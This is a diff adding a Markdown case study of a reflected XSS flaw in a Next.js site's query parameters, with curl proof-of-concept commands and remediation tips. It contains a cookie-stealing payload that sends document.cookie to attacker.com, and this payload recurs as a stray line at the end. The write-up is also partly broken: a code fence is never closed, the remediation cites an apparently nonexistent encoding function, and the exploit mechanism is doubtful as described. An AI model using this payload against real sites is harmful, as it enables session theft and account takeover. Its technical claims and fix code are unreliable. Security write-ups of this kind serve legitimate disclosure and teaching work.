@@ -1,0 +1,84 @@
+---
+layout: case-study
+title: "Critical Reflected XSS via Next.js Query Parameters"
+subtitle: "Unsanitized parameter reflection in SSR context leads to arbitrary JavaScript execution"
+date: 2024-11-01
+author: "Your Name"
+tags: [xss, nextjs, web-security, authentication-bypass]
+cvss: "8.8"
+risk-level: "Critical"
+summary: "Discovered reflected XSS vulnerability where multiple URL parameters reflect unsanitized user input in Next.js server-side rendered HTML, allowing arbitrary JavaScript execution in a major SaaS platform."
+---
+
+## Discovery
+During security assessment of a major writing platform's main website, identified that multiple query parameters were reflecting user input directly into server-side rendered HTML without proper sanitization.
+
+## Technical Details
+### Vulnerability Analysis
+The vulnerability occurs in Next.js server-side rendering context where user input from URL parameters is embedded directly into the `__NEXT_DATA__` script tag without proper encoding.
+
+```json
+<script id="__NEXT_DATA__" type="application/json">
+{"pageProps":{"ssrData":{"query":{"__nextLocalePatch":"en-US","q":"REFLECTED_HERE"}}}}
+</script>
+
+Affected Parameters
+q - Primary search parameter
+
+search - Alternative search parameter
+
+text - Text input parameter
+
+input - General input parameter
+
+Proof of Concept
+
+# Confirm parameter reflection
+curl -s "https://target.com/?q=TEST_XSS" | grep -o "TEST_XSS"
+
+# XSS payload confirmation  
+curl -s "https://target.com/?q=<script>alert(document.domain)</script>"
+
+Exploitation
+Attack Scenarios
+Cookie Theft: Steal authentication cookies and session tokens
+
+Credential Harvesting: Capture user credentials through fake login forms
+
+Account Takeover: Perform actions as authenticated users
+
+Working Payloads
+
+https://target.com/?q=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
+
+Impact Analysis
+Technical Impact
+Arbitrary JavaScript execution in victim's browser
+
+Session hijacking and authentication bypass
+
+Complete account compromise for millions of users
+
+Business Impact
+Reputation damage to trusted platform
+
+Potential compliance violations
+
+Financial impact from customer churn
+
+Remediation
+Immediate Fixes
+
+// Input sanitization
+const sanitizedInput = DOMPurify.sanitize(userInput);
+
+// Output encoding
+const encodedValue = encodeHTMLComponent(userInput);
+Key Lessons
+Never trust user input in server-side rendering contexts
+
+Implement comprehensive input validation across all parameters
+
+Use proper output encoding when embedding user data in HTML
+
+https://target.com/?q=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
